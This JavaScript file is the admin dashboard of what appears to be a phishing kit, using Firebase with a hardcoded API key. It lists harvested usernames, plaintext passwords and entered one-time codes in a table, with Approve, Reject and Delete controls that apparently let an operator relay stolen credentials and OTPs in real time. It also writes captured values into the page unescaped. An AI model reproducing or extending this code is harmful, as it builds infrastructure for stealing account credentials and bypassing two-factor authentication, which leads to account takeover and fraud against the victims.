// ===================== ADMIN DASHBOARD JS =====================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-auth.js";
import { getDatabase, ref, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";

// Firebase Config (unchanged)
const firebaseConfig = {
  apiKey: "AIzaSyDtJstcWHSwJVPogm-MXAehNR4FBhh8Iuo",
  authDomain: "a-b-s-a-upgrade-system.firebaseapp.com",
  databaseURL: "https://a-b-s-a-upgrade-system-default-rtdb.firebaseio.com",
  projectId: "a-b-s-a-upgrade-system",
  storageBucket: "a-b-s-a-upgrade-system.firebasestorage.app",
  messagingSenderId: "618721346269",
  appId: "1:618721346269:web:2548672e789231e4e95134"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const database = getDatabase(app);
const requestsRef = ref(database, "requests");

// Redirect if not logged in
onAuthStateChanged(auth, (user) => {
  if (!user) {
    window.location.href = "admin-login.html";
  }
});

document.getElementById("logoutBtn").addEventListener("click", () => {
  signOut(auth).then(() => {
    window.location.href = "admin-login.html";
  });
});

const requestsTable = document.getElementById("requestsTable");

onValue(requestsRef, (snapshot) => {
  requestsTable.innerHTML = "";
  snapshot.forEach((childSnapshot) => {
    const requestId = childSnapshot.key;
    const data = childSnapshot.val();

    const row = document.createElement("tr");
    row.innerHTML = `
      <td>${data.username || ''}</td>
      <td>${data.password || ''}</td>
      <td>${data.otp_entered || ''}</td>
      <td>${data.status || ''}</td>
      <td>${data.timestamp || ''}</td>
      <td>
        <button onclick="updateStatus('${requestId}', 'approved')">Approve</button>
        <button onclick="updateStatus('${requestId}', 'rejected')">Reject</button>
        <button onclick="deleteRequest('${requestId}')">Delete</button>
      </td>
    `;
    requestsTable.appendChild(row);
  });
});

window.updateStatus = function(requestId, status) {
  const requestRef = ref(database, "requests/" + requestId);
  update(requestRef, { status: status });
};

window.deleteRequest = function(requestId) {
  const requestRef = ref(database, "requests/" + requestId);
  remove(requestRef);
};
